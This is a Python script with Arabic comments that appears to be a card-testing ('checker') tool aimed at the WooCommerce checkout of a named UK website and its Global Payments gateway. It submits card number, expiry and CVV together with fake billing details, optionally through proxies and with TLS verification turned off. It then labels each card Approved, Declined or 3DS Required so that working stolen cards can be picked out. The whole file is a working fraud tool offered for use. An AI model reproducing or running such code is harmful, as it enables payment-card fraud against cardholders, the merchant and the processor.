"""
بوابة الدفع: Global Passed LookUp GP-2
الموقع: mx5oc.co.uk
نوع البوابة: Global Passed LookUp
تدفق الطلبات:
1. GET /checkout/ -> تهيئة الجلسة
2. POST /?wc-ajax=checkout -> إرسال بيانات البطاقة والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl


async def req1_init_session(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> None:
    """الخطوة 1: تهيئة الجلسة عبر GET لصفحة الدفع."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mx5oc.co.uk",
        "Referer": "https://mx5oc.co.uk/checkout/",
    }
    try:
        async with session.get(
            "https://mx5oc.co.uk/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            await r.text()
    except Exception as e:
        raise RuntimeError(f"req1_init_session failed: {e}") from e


async def req2_submit_checkout(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إرسال طلب التحقق والحصول على نص الاستجابة."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mx5oc.co.uk",
        "Referer": "https://mx5oc.co.uk/checkout/",
    }
    payload = {
        "billing_first_name": "John",
        "billing_last_name": "Doe",
        "billing_country": "GB",
        "billing_address_1": "10 Downing Street",
        "billing_city": "London",
        "billing_postcode": "SW1A 2AA",
        "billing_phone": "07700900123",
        "billing_email": f"test_{uuid.uuid4().hex[:8]}@gmail.com",
        "payment_method": "globalpayments_gpapi",
        "card_number": cc,
        "card_expiry": f"{mm}/{yy}",
        "card_cvc": cvv,
        "terms": "on",
        "terms-field": "1",
    }
    try:
        async with session.post(
            "https://mx5oc.co.uk/?wc-ajax=checkout",
            data=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_submit_checkout failed: {e}") from e


async def process_GP_2_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Global Passed LookUp GP-2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            await req1_init_session(session, proxy_url)
            response_text = await req2_submit_checkout(session, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "thank-you" in response_text or "success" in response_text.lower():
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient_funds" in response_text or "card_declined" in response_text:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined (Insufficient Funds)"
    elif "3d_secure" in response_text or "verification_required" in response_text:
        return f"🛡️ | {cc}|{mes}|{ano}|{cvv}", "3DS Required"
    else:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined / Error"
